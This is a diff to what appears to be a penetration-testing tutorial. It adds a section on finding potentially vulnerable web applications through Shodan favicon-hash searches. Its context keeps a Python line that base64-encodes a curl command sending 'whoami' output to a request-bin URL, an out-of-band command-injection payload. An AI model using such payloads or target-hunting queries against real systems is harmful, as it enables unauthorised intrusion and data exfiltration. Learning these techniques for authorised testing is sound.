@@ -17,7 +17,19 @@ But we can also use more specific queries to find targets that interest us. You 
 
 <img src="./assets/shodan_finding_2-2.png" width=800 height=400>
 
-TODO Find targets using favicon hash with shodan
+Another way to find vulnerable targets is the **favicon hash**. Favicon is the shortand for favourite icon. It is used as a shortcut to other webpages. Browsers that use these icons usually display them in the address bar, as well as in the history.
+
+<img src="./assets/favicon.png" width=474 height=142>
+
+You can find the favicon hash of an website, using the [FaviconHash website](https://faviconhash.com). For example, let's find out the favicon hash of the github.com website.
+
+<img src="./assets/favicon.png" width=600 height=300>
+
+Now, we can use the ```http.favicon.hash:1848946384``` filter to find some GitHub based web-sites.
+
+<img src="./assets/github_favicon.png" width=800 height=400>
+
+As you can see, we now have more than 700 results of potential vulnerable applications. Note that in order to use Shodan filters (http.favicon.hash) you must be logged in.
 
 ### Find targets using Google Dorks
 
@@ -200,7 +212,7 @@ import base64
 base64.b64encode(b'curl -d $(whoami) <REQUEST-BIN-URL>')
 ```
 
-<img src="./assets/python_encode.png" width=900 height=50>
+<img src="./assets/python_encode.png" width=700 height=50>
 
 
 ```
